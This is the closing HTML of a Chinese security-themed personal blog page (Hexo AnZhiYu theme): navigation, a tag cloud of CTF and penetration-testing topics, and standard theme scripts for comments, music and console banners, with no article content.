class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>